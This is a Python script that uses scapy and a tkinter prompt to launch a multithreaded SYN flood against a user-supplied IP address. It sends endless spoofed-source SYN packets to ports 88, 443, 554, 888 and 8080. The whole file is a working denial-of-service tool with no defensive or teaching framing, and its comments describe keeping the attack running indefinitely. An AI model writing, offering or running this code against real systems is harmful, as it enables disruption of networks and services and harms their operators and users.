import tkinter as tk
from tkinter import simpledialog
from scapy.all import *
import threading
import random

# Function to generate random source IP
def random_ip():
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

# Function to perform SYN flood attack
def syn_flood(target_ip, target_port):
    print(f"Starting SYN flood on {target_ip}:{target_port}")
    while True:
        ip_layer = IP(src=random_ip(), dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

# Function to get target IP address from user
def get_target_ip():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    target_ip = simpledialog.askstring("Target IP", "Enter the target IP address:")
    root.destroy()
    return target_ip

# Main function to start attacks on multiple ports
def main():
    target_ip = get_target_ip()
    if not target_ip:
        print("No IP address entered. Exiting.")
        return
    
    ports = [88, 443, 554, 888, 8080]
    
    threads = []
    for port in ports:
        thread = threading.Thread(target=syn_flood, args=(target_ip, port))
        thread.start()
        threads.append(thread)

    # Keep the main thread alive to allow the attack to run indefinitely
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nStopping all attacks...")

if __name__ == "__main__":
    main()
